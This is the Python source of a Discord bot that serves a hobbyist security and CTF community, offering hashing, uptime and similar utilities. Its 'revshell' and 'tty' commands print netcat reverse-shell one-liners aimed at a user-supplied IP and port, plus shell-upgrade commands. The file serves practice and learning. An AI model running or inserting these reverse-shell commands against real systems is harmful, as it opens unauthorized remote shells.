######  Copyright 2023 Daniel Tomov  #######
import discord
import os
import random
import asyncio
import datetime, time
import hashlib
from rssparser import RSSParser

from dotenv import load_dotenv
load_dotenv()
TOKEN = os.getenv('TOKEN')

### Register intents and client ###
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

### Slash Commands ###
tree = discord.app_commands.CommandTree(client=client)
#servers = [discord.Object(id=1160247666870075422), discord.Object(id=923420517560627272), discord.Object(id=1199927068599799860)]

@tree.command(name="ping", description="Gives latency between you and the bot")
async def ping(interaction):
    await interaction.response.send_message(f'Pong: {round(client.latency, 3)}ms', ephemeral=True)

@tree.command(name="revshell", description="Get a reverse shell")
async def revshell(interaction, ip_address: str, port: int):
    await interaction.response.send_message(f"""
                                            Don't forget ```bash\nnc -lnvp {port}\n```
                                            https://www.revshells.com/
                                            ```bash\nnc {ip_address} {port} -e sh```
                                            ```bash\nnc -c sh {ip_address} {port}```
                                            ```bash\nncat {ip_address} {port} -e sh```
                                            """.replace("    ", ""), ephemeral=True)

@tree.command(name="tty", description="Get a TTY Shell")
async def tty(interaction):
    await interaction.response.send_message(f"""
                                            ```bash\npython -c 'import pty; pty.spawn("/bin/sh")'```
                                            ```bash\necho 'os.system('/bin/bash')'```
                                            ```bash\n/bin/sh -i```
                                            """.replace("    ", ""), ephemeral=True)

@tree.command(name="lolbins", description="Get websites for Living Off the Land (LOL) binaries")
async def lolbins(interaction):
    await interaction.response.send_message(f"""
                                            Windows: https://lolbas-project.github.io/
                                            Linux: https://gtfobins.github.io/
                                            """.replace("    ", ""), ephemeral=True)

@tree.command(name="github", description="DinoBot Github")
async def github(interaction):
    await interaction.response.send_message("https://github.com/Daniel-Tomov/DinoBot", ephemeral=True)

@tree.command(name="md5", description="Get the MD5 hash for a string")
async def md5(interaction, string: str):
    await interaction.response.send_message(hashlib.md5(string.encode('utf-8')).hexdigest(), ephemeral=True)

@tree.command(name="sha1", description="Get the SHA1 hash for a string")
async def sha1(interaction, string: str):
    await interaction.response.send_message(hashlib.sha1(string.encode('utf-8')).hexdigest(), ephemeral=True)

@tree.command(name="sha256", description="Get the SHA256 hash for a string")
async def sha256(interaction, string: str):
    await interaction.response.send_message(hashlib.sha256(string.encode('utf-8')).hexdigest(), ephemeral=True)

@tree.command(name="sha512", description="Get the SHA512 hash for a string")
async def sha512(interaction, string: str):
    await interaction.response.send_message(hashlib.sha512(string.encode('utf-8')).hexdigest(), ephemeral=True)

@tree.command(name="uptime", description="Uptime of Dinobot")
async def uptime(interaction):
    global startTime
    await interaction.response.send_message(str(datetime.timedelta(seconds=int(round(time.time()-startTime)))), ephemeral=True)

@tree.command(name="self-destruct", description="Self-destruct a message")
async def selfdestruct(interaction, string: str): 
    await interaction.response.send_message("This message will self-destruct in 5 seconds: \n" + string)

    counter = 5
    while counter > 1:
        await asyncio.sleep(1)
        counter -= 1
        msg = await interaction.original_response()
        await msg.edit(content=f"This message will self-destruct in {str(counter)} seconds: \n{string}")
        
    await asyncio.sleep(1)
    await msg.reply("Oh no! This message has self-destructed. You snooze you loose.")
    await msg.delete()
    #await msg.edit(content="Oh no! This message has self-destructed. You snooze you loose.")

### Listeners ###

@client.event
async def on_ready():
    client.loop.create_task(presence())

    #for server in servers:
    #    await tree.sync(guild=server)

    global startTime
    startTime = time.time()

    RSSParser(client)
    
    print(f'{client.user} is ready and listening')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!hello'):
        await message.channel.send('Hello!')


### Functions ###
async def presence():
    await client.wait_until_ready()

    presence_states = [
        discord.Activity(type=discord.ActivityType.watching, name='John Hammond'),
        discord.Activity(type=discord.ActivityType.watching, name='The PC Security Channel'),
        discord.Activity(type=discord.ActivityType.watching, name='NetworkChuck'),
        discord.Activity(type=discord.ActivityType.watching, name='HackerSploit'),
        discord.Activity(type=discord.ActivityType.watching, name='Infosec'),
        discord.Activity(type=discord.ActivityType.watching, name='ComputerPhile'),
        discord.Activity(type=discord.ActivityType.watching, name='David Bombal'),
        discord.Activity(type=discord.ActivityType.watching, name='Dion Training'),
        discord.Activity(type=discord.ActivityType.watching, name='SmarterEveryDay'),
        discord.Activity(type=discord.ActivityType.watching, name='BenEater'),
        discord.Activity(type=discord.ActivityType.watching, name='Veritasium'),
        discord.Activity(type=discord.ActivityType.watching, name='Hak5'),
        discord.Activity(type=discord.ActivityType.playing, name='with a Flipper Zero'),
        discord.Activity(type=discord.ActivityType.playing, name='with a WiFi Pineapple'),
        discord.Activity(type=discord.ActivityType.playing, name='with a Rubber Ducky'),
        discord.Activity(type=discord.ActivityType.playing, name='Vulnhub'),
        discord.Activity(type=discord.ActivityType.playing, name='picoCTF'),
        discord.Activity(type=discord.ActivityType.playing, name='Hack The Box'),
        discord.Activity(type=discord.ActivityType.playing, name='TryHackMe'),
        discord.Activity(type=discord.ActivityType.playing, name='Ghidra'),
        discord.Activity(type=discord.ActivityType.listening, name='The WAN Show'),
        discord.CustomActivity(name='Preparing for CyberForge'),
        discord.CustomActivity(name='Preparing for CyberFusion'),
        discord.CustomActivity(name='Studying for Security+'),
    ]
    
    while not client.is_closed():
        status = random.choice(presence_states)
        await client.change_presence( activity=status )
        await asyncio.sleep(3600)

client.run(token=TOKEN)